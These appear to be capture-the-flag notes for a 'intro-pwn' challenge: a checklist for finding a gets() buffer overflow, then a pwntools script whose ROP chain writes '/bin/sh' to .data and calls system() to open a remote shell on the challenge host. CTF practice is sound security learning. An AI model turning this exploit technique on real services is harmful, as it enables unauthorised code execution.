enumerate bin:
  file [file]
  checksec --file=[file]
source code
  cat [file]
    look for unsanitised gets function

Find buffer flow offset
  pwndbg> cyclic 200
        > run
        > cyclic -l [traceback address]
          "offset = ??"
Find useful functions
  objdump -d [file] | grep system
  objdump -d [file] | grep gets@plt
  readelf -S [file] | grep .data

Write /bin/sh into the .data section
Call system() with address of /bin/sh

SCRIPT

from pwn import *
#connections
#io = process("./intro-pwn")
io = process(["ncat", "--ssl-verify", "8eabc9018ee7a886c929aaf1-1024-intro-pwn-1.challenge.cscg.live", "1337"])

#add ncat process here after testing

#addresses found with gdb
pop_rdi         = 0x401205      #ROPgadget --binary ./intro-pwn | grep "pop rdi"
system_addr     = 0x401040      #objdump -d ./intro-pwn | grep system
data_addr       = 0x404028      #readelf -S ./intro-pwn | grep .data
gets_addr       = 0x401060      #objdump -d ./intro-pwn | grep gets@plt

#payload
payload = b"A" * 24 #offset

#write "/bin/sh" to .data section
payload += p64(pop_rdi)         #sets rdi to the address of .data
payload += p64(data_addr)
payload += p64(gets_addr)       #use gets() to write "/bin/sh" to .data

#call system("/bin/sh")

payload += p64(pop_rdi)      # Set RDI to the address of "/bin/sh"
payload += p64(data_addr)
payload += p64(system_addr)  # Call system()

io.sendline(payload)
io.sendline(b"/bin/sh")      # Provide "/bin/sh" as input
io.interactive()
